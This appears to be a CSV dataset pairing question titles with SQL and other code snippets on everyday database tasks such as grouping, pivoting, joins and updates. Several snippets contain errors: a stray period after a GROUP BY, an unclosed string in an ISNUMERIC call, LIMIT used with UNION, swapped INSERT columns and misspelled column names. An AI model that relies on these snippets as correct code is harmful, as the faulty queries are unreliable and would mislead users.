,Unnamed: 0,NL,Code
38391,70890,Nested IF statements SQL,"SELECT c.column_id,
         'public '+
          (CASE WHEN t.name IN ('int', 'bigint') THEN 'Int32?' 
               WHEN t.name IN ('nvarchar','varchar','text','ntext') THEN 'String'
               WHEN t.name IN ('datetime','smalldatetime') THEN 'DateTime?'
               WHEN t.name IN ('decimal') THEN 'Decimal?'
               WHEN t.name IN ('bit') THEN 'Boolean?'
               ELSE 'Unknown'
           END) + ' ' + c.name + '{ get; set; }'
    FROM    
        sys.columns c
    INNER JOIN 
        sys.types t ON c.user_type_id = t.user_type_id
    WHERE 
       c.object_id = OBJECT_ID(@TableName)
    AND
        c.is_identity = 0
    UNION 
        select 1000 as colid, '}'
"
32533,30817,SQL - Get highest and lowest record,"SELECT * from table 
  ORDER BY end_date DESC 
  LIMIT 1
UNION ALL
SELECT * from table 
  ORDER BY start_date ASC 
  LIMIT 1
"
7590,66887,SQL Instead of trigger is not fireing sometimes?,";with maxID as (
    select MAX(EventID) as EventID from Event
), nrows as (
    select
        ROW_NUMBER() OVER (ORDER BY newid()) +
            COALESCE((select EventID from maxID),0) as EventID,
        /* columns from inserted table */
    from inserted
)
insert into Event (EventID,/* other columns */)
select EventID,/* other columns */
from nrows
"
9466,14695,Database Table Synonym/Alias,"CREATE VIEW MOST_RECENT_JOB_LISTINGS AS 
SELECT * FROM job_listings_20151228
"
27715,69690,Updating a new SQL column with values from the table,"UPDATE test SET
testcalc = x + y

SELECT * FROM test
"
19173,65572,SQL Query count,"SELECT i.idI, i.ingrDesc, COUNT(*)
FROM Ingredient i
INNER JOIN RecipIngr ri ON i.idI = ri.idI
GROUP BY i.idI, i.ingrDesc
HAVING COUNT(*) > 10
"
25471,61405,Inner queries on a single table,"select user_id
  from my_table
 where role_id in (13,15)
 group by user_id.
having count(distinct role_id) = 2
"
3553,47569,SQL Server Group By which counts occurrences of a score,"SELECT TOP 2 i.itemName 
FROM Items i
left outer join (
    select ItemID, 
        sum(case when score = 10 then 1 end) as Score10,
        sum(case when score = 9 then 1 end) as Score9,
        sum(case when score = 8 then 1 end) as Score8,
        sum(case when score = 7 then 1 end) as Score7,
        sum(case when score = 6 then 1 end) as Score6,
        sum(case when score = 5 then 1 end) as Score5,
        sum(case when score = 4 then 1 end) as Score4,
        sum(case when score = 3 then 1 end) as Score3,
        sum(case when score = 2 then 1 end) as Score2,
        sum(case when score = 1 then 1 end) as Score1
    from Votes
    group by ItemID
) v on i.ID = v.ItemID
ORDER BY i.score, 
    v.Score10,
    v.Score9,
    v.Score8,
    v.Score7,
    v.Score6,
    v.Score5,
    v.Score4,
    v.Score3,
    v.Score2,
    v.Score1
"
12621,40959,Average of sums in MySQL,"select sum(onhand) / count(distinct branchnum) as avg_per_branchnum
from atablelikethis;
"
15039,49741,SQL: How do i convert period per column to period per row,"SELECT [Project Name], '2015' AS [Period], [2015] AS [Value]
FROM your spreadsheet

UNION ALL

SELECT [Project Name], '2016' AS [Period], [2016] AS [Value]
From your spreadsheet

Order By Project Name, Period
"
29663,30215,Compare output of select statement,"select group_concat(EmployeeName) as `o/p`
from Table2 
where FIND_IN_SET(EmployeeID, 
    (select Participantsid from Table1 
    where Validfrom = '2016-02-22 18:00:00' and Validto = '2016-02-22 19:00:00'));
"
7657,1602,"SQL server: Inserting a bunch of rows into a table, generating a ""batch id"" for every 100?",";WITH x AS 
(
  SELECT col1, rn = ROW_NUMBER() OVER (ORDER BY col1) FROM dbo.OtherTable
)
--INSERT dbo.BatchTable(batch_id, col1)
SELECT batch_id = (99+rn)/100, col1 FROM x;
"
30279,58964,T-SQL Case Statement in a JOIN ON Clause,"LEFT JOIN [CTSTRC] [Statuses] ON 
    (CASE WHEN ISNUMERIC(RIGHT([Statuses].[STRID], 3) + '.0e0) = 1 
          THEN  CAST(RIGHT([Statuses].[STRID], 3) AS INT) 
          ELSE 0  END) = [CTE].[F61] 
"
29475,48260,Show all rows in MySQL that contain the same value (2 column filter),"SELECT c2, GROUP_CONCAT(DISTINCT c1)
FROM table
group by c2 HAVING count(distinct c1)>1
"
5238,42607,SQL server determine which row was inserted?,"DECLARE @output TABLE (id int)

Insert into A (fname, lname)
OUTPUT inserted.ID INTO @output
SELECT fname, lname FROM B

select * from @output
"
38668,1168,Is this the correct way to sort rows which have the same insert datetime?,"SELECT name, species, birth FROM pet
ORDER BY species, birth DESC
"
39074,41395,Sum or Multiply in SQL Server,"Number3 as (Number1 + Number2)
"
11188,36681,Django DB API equivalent of a somewhat complex SQL query,"from django.db.models import Max
mail_list = Mail.objects.values('conversation_id').annotate(Max('id'))
conversation_id_list = mail_list.values_list('id__max',flat=True)
conversation_list = Mail.objects.filter(id__in=conversation_id_list)
"
8764,33695,SQL grouping results by first date of the week,"SELECT DATEPART(WK,CAST(a.sale_date AS DATE)), 
max(DATEADD(dd, -(DATEPART(dw, a.sale_date) - 1), a.sale_date)) as WeekStart, sum(1) as Count 
from testdata a
where a.sale_date >= Dateadd(DAY, Datediff(Day, 0, DATEADD(WEEK, -52, current_timestamp)), 0)
group by DATEPART(WK,CAST(a.sale_date AS DATE));
"
24972,67092,Display Columns into Rows,"WITH CTE AS (
    SELECT        
         SUBSTRING([project],11,4) AS ProjectID
       , SUBSTRING([fiscalno],1,4) AS FiscYr
       ,'Period ' + SUBSTRING([fiscalno],5,2) AS Period
       , Amount
    FROM [dbo].[PJTran] 
    WHERE pjtran.gl_Acct LIKE '1[23]%' 
)

SELECT * FROM CTE
PIVOT (SUM(Amount) FOR Period IN (
    [Period 1],[Period 2], [Period 3], [Period 4],
    [Period 5],[Period 6], [Period 7], [Period 8],
    [Period 9],[Period 10],[Period 11],[Period 12]
    )
) p;
"
26869,5020,CONTAINS with multiple terms over multiple columns,"DROP TABLE t_ft
CREATE TABLE t_ft (id INT NOT NULL,
        data1 NVARCHAR(MAX) NOT NULL, data2 NVARCHAR(MAX) NOT NULL, data3 NVARCHAR(MAX) NOT NULL,
        totaldata AS data1 + ' ' + data2 + ' ' + data3,
        CONSTRAINT pk_ft_id PRIMARY KEY (id))

CREATE FULLTEXT INDEX ON t_ft (totaldata LANGUAGE 1033) KEY INDEX pk_ft_id

INSERT
INTO    t_ft
VALUES  (1, 'foo bar', 'baz', 'text')

INSERT
INTO    t_ft
VALUES  (2, 'foo bar', 'bax', 'text')


SELECT  *
FROM    t_ft
WHERE   CONTAINS (*, 'foo AND baz') 
"
130,59113,Detecting duplicates which fall outside of a date interval,"select hospital_id
       , count(*) as total_num_of_patients      
       , sum (out_of_range) as num_of_patients_out_of_range
from (
    select patient_id
           , hospital_id
           , case
                   when hospital_id_1 = hospital_id_0
                   and  visit_1 > visit_0 + 10
                   and  med_op_code_1 = med_op_code_0
                   then 1
                   else 0
              end as out_of_range
    from (
            select patient_id
                   , hospital_id as hospital_id_1
                   , date as visit_1
                   , med_op_code as med_op_code_1
                   , lag (date) over (partition by patient_id order by date) as visit_0
                   , lag (hopital_id) over (partition by patient_id order by date) as hopital_id_0
                   , lag (med_op_code) over (partition by patient_id order by date) as med_op_code_0
            from your_table
            where med_op_code = 'P1'
        )
    )
group by hospital_id
/
"
36794,13318,Four Tables show single occurrence for outer most table,"SELECT DISTINCT ON(companies.name, employees.first_name) 
   applicants.id, companies.name, employees.first_name, departments.name, applied_date
FROM applicants
INNER JOIN departments ON applicants.department_id = departments.id
INNER JOIN companies ON departments.university_id = companies.id
INNER JOIN employees ON applicants.student_id = employees.id
ORDER BY companies.name, employees.first_name, applied_date
"
12906,61974,Pick which value to feed in second parameter in SSRS,"WHERE (@DateType = 'Created' AND ProductCreatedDate BETWEEN @StartDate AND @EndDate)
      OR (@DateType = 'Sold' AND ProductSoldDate BETWEEN @StartDate AND @EndDate)
"
27102,16303,how to execute multiple procedure script in sql-server,"declare @sql nvarchar(max)=''
select @sql+= 'exec pr_tblmaster_split ''tblmaster_'+  Cast(year as nvarchar(4000)) +'''; ' 
from  tblmaster
group by year_id 
order by year_id asc

exec sp_executesql @sql
"
30876,18966,SQL Server DISTINCT pagination with ROW_NUMBER() not distinct,"WITH t AS
(
   SELECT [insert your fields here], ROW_NUMBER() OVER (ORDER BY Date) AS num 
   FROM (
     SELECT DISTINCT *[insert your fields here]
     FROM Original_Import 
     LEFT JOIN eqcas.dbo.BASE_PROXY_VIEW_WITHTARGET ON ADName = Targetuser
     WHERE (BaseProxy = 'agmc' OR ADName = 'agmc')
      AND (Commited IS NULL OR Commited = 0)) as X
)
SELECT DISTINCT ID, num, ADName, Description_User, Description_Amex, Amount, Date
FROM t 
WHERE (t.BaseProxy = 'agmc' OR t.ADName = 'agmc') 
   AND num BETWEEN 0 AND 20
   AND (Commited IS NULL OR Commited = 0)
ORDER BY Date
"
2909,16291,Weekly total change name,"SELECT 'week ' + CONVERT(varchar(255), DATEPART(ww, D_Date) - 26) AS ReportingWeek,
       Proj_name, SUM(Expr1) AS total
FROM  dbo.View_Test_Two
GROUP BY DATEPART(ww, D_Date), Proj_name
ORDER BY min(D_Date);
"
13691,53419,Sql query to find the all subordinates under a single superior,"WITH Subordinates AS
(
   SELECT e.Emp_ID, e.Emp_Name, e.Emp_Manager_ID
   FROM Employee AS e
   WHERE e.Emp_Manager_ID = 2

   UNION ALL

   SELECT e.Emp_ID, e.Emp_Name, e.Emp_Manager_ID
   FROM Employee AS e
   INNER JOIN Subordinates AS sub ON e.Emp_Manager_ID = sub.Emp_ID
)
SELECT s.Emp_ID, s.Emp_Name, s.Emp_Manager_ID
FROM Subordinates AS s
"
12088,52767,MySQl Query Help,"UPDATE table1 t1 JOIN table2 t2 ON t1.id = t2.id
SET t1.col1 = t2.col2, t1.col2 = t2.col2
"
24961,55847,Is there any way to join two update queries into one?,"update user 
set name = 
    case when id = '1' then 'Something' 
         when id = '2' then 'Newthing' 
    end
where id in ('1','2')
"
27119,4820,Search Multiple Columns Returned Most Matches,"select boxId, sum(matches) 
from (select boxID, 
      (case when styleId IN (4) then 1 else 0 end) + 
      (case when colorId in (1, 5) then 1 else 0 end) matches 
       from test) t1
group by boxId
order by sum(matches) desc;
"
24848,63381,SQL result sorted twice on same column,"Select ...
From MyTable
Order By Case When Col = 0 Then 1 Else 0 End Asc, Col Asc
"
25762,72778,need Oracle query - get a list of differnet attributes from a column,"select distinct column_value from table
"
27409,66118,"Rewrite ""IN"" statement","SELECT * FROM MyTable WHERE 0 = 1 UNION SELECT whatIWant FROM whereIWant
"
27854,32967,Database model for different range of prices for products,"idmaterial    material  Idpricetype
-----------------------------------
1              iron        1
2              steel       1
3              alu         2


Idpricetype   name     unit
---------------------------------
1             weight   kg
2             lenght   mm

idmaterial  price    unitforprice
---------------------------------
1           0.5      1
2           0.8      1
3           10       100
3           18       200
3           35       500
3           50       1000
"
38248,11057,How to count hits greater than X in Access?,"SELECT
    COUNT([user])
FROM
    [table]
WHERE
    hits > 10
GROUP BY
    [user]
"
20319,22399,Method to test a deploy in production?,"Use [$(DBNAME)]
GO

:Error $(ErrorOutputFileFromCommandLine) 

IF EXISTS (    SELECT TABLE_SCHEMA , TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'Employee' and TABLE_SCHEMA = 'dbo'    )
    BEGIN

        IF EXISTS 
        (
            SELECT * 
                FROM [INFORMATION_SCHEMA].[COLUMNS] 
            WHERE   
                TABLE_NAME = 'Employee' 
                AND TABLE_SCHEMA = 'dbo'
                AND COLUMN_NAME = 'LastName'
                AND CHARACTER_MAXIMUM_LENGTH < 128
        )
            BEGIN
                print 'Altering the column dbo.Employee.*LastName*'

                ALTER TABLE [dbo].[Employee]
                ALTER COLUMN [LastName] varchar(128) NOT NULL;

            END
        ELSE
            BEGIN
                print 'The column dbo.Employee.*LastName* already exists and supports 128 characters.'
            END

    END

GO
"
31947,3702,Oracle query inner join trouble,"select  
     mum.wisdom as wisdom_mum,
     dad.wisdom as wisdom_dad
from
     megaAvatars m
     inner join superAvatars mum on mum.sAvatarsID = m.mum
     inner join superAvatars dad on dad.sAvatarsID = m.dad
where
     m.hoard = 100
"
8364,1911,Ordering by the order of values in a SQL IN() clause,"SELECT name, description, ...
FROM ...
WHERE id IN([ids, any order])
ORDER BY FIELD(id, [ids in order])
"
5388,17368,MySQL query missing IDs,"SELECT 
    ut.idu as IDU,
    ut.fname || ut.lname as Name,
    (SELECT COUNT(*) FROM events_table) - SUM(CASE WHEN at.idu is null then 0 else 1 end) as TimesAbsent
FROM attendance_table at
RIGHT JOIN user_table ut
ON at.idu = ut.idu
GROUP BY ut.idu, ut.fname, ut.lname
"
2999,53468,Soft delete in SQL Server using stored procedure,"Update t 
set t.IsDeleted = 1 
from tblTeam t
where t.TeamId = @pteamid 
and not exists (select 1 from tblUser where TeamId = @pteamid)
and not exists (select 1 from tblAcount where TeamId = @pteamid)
"
5298,68176,SSIS - Convert a varchar field to unique identifier,"public override void Input0_ProcessInputRow(Input0Buffer Row)
{
// Create a Globally Unique Identifier with SSIS
    Row.GUID = System.Guid.NewGuid(); 
}
"
22581,510,Command Prompt: Check whether windows service is started or not,"start /wait sc start <name-of-your-oracle-service>
"
33147,25876,SQL - Complex Data Migration from Old Structure to New Structure,"INSERT INTO [UserSessionLogs]([PropertyID], [IPAddress], [UserID])
SELECT [PropertyID], [UserID], [IPAddress]
FROM [OldApplicationLogs]
GROUP BY [PropertyID], [UserID], [IPAddress];

INSERT INTO [ApplicationLogs]([UserSessionLogID], [Action], [Controller], [Operation], [Created], [EntityID], [EntityKey], [RelativeURL])
SELECT 
    B.[ID],
    A.[Action], 
    A.[Controller],
    A.[Operation],
    A.[LoggedDate],
    C.[TableName],
    CAST(A.[EntityKey] AS INT),
    REPLACE(A.[AbsoluteURL],'www.myapp.com/','')
FROM [OldApplicationLogs] A
INNER JOIN [UserSessionLogs] B
ON      A.[UserID] = B.[UserID]
LEFT JOIN [Entities] C
ON      A.[EntityType] = C.[TableName]
"
32893,42245,How to sum data by column with different name,"select coalesce(name, 'SUM') as name,
       count(*) as [count],
       SUM(balance1) as balance1, SUM(balance2) as balance2
from mytbl
where [date] between ... --some filters
group by grouping sets( (name, left(name, 1)), (left(name, 1)) );
"
38157,48830,Calculate the overlap between two unrelated tables in posgres/posgis,"WITH CTE1 AS
(
    SELECT ROW_NUMBER() OVER(ORDER BY col1) AS ROWNUM, col1 FROM tab1
),
CTE2 AS
(
    SELECT ROW_NUMBER() OVER (ORDER BY col1) AS ROWNUM, col1 FROM tab2
)
SELECT CTE1.col1 AS RES_T1, CTE2.col1 AS RES_T2
FROM CTE1 FULL JOIN CTE2 ON CTE1.ROWNUM = CTE2.ROWNUM
"
25136,16572,Duplicate Rows of Data Except 2 columns,"SELECT CheckSheet_No,
       MAX(CASE WHEN rn=1 THEN Fault END) As Fault1,
       MAX(CASE WHEN rn=2 THEN Fault END) As Fault2,
       MAX(CASE WHEN rn=3 THEN Fault END) As Fault3
FROM
   (
   SELECT CheckSheet_No,Fault,
       Row_Number() Over(Partition By CheckSheet_No Order By Fault) as rn
   FROM CheckSheet_fault 
   ) Z
GROUP BY Z.CheckSheet_No
"
8706,33061,Check if external database is online,"OPENQUERY ( [192.168.111.33] ,'select databasepropertyex(MuOtherDatabase, ''Status'')' )
"
33909,22488,Select a column's data in a group and place in new column across entire group,"SELECT 
    JobNum, ReqDateTime, RowNum,
    (select min(ReqDateTime) from JobTable jt2 where jt2.JobNum = jt1.JobNum group by JobNum) as FirstDateInEachGroup
FROM Jobtable jt1
"
